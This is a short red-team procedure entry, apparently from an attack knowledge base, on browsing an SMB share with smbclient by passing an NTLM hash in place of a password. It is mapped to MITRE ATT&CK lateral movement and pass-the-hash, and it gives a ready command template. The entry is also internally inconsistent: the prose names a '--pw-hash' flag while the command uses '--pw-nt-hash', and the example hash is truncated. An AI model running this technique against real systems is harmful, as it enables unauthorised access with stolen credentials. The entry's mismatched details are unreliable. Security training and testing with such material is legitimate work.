---
id: 34c06382-f3bf-42e4-88ac-d50644de537a
name: Browse SMB Share (NTLM)
type: procedure
verified: false
submitted: false
created_at: '2019-12-16T19:14:15.546189+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Pass the Hash|T1075 - Pass the Hash]]'
platforms:
- Windows
tags:
- '[[Network]]'
- '[[Service Attacks]]'
commands:
- '[[smbclient Connect to an SMB Share (NTLM)]]'
---

# Browse SMB Share (NTLM)

## Summary

Use smbclient to browse an SMB share, authenticating with an NTLM password hash instead of the password itself. 

## Description

# Description

Use smbclient to browse an SMB share, authenticating with an NTLM password hash instead of the password itself.



# Instructions

Smbclient expects hashes to be supplied in NT hash format, meaning both LM and NTLM are included. Format:





**Code**: [[<32 character LM hash>:<32 character NTLM hash>]]





The LM portion of the hash is not needed, so a common solution is to include the NTLM hash twice, separated with a colon. Example:





**Code**: [[81ABA903C80B8F4DAAD5225F7D996FBC:81ABA903C80B8F4DA]]





To authenticate with a hash, replace the password with the hash value, and include the "--pw-hash" argument.





**Command** ([[smbclient Connect to an SMB Share (NTLM)]]):

```bash
smbclient -U $_USERNAME%$_NTLM_HASH:$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
```





## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Pass the Hash|T1075 - Pass the Hash]]

## Commands Used

- [[smbclient Connect to an SMB Share (NTLM)]]

## Tags

- [[Network]]
- [[Service Attacks]]


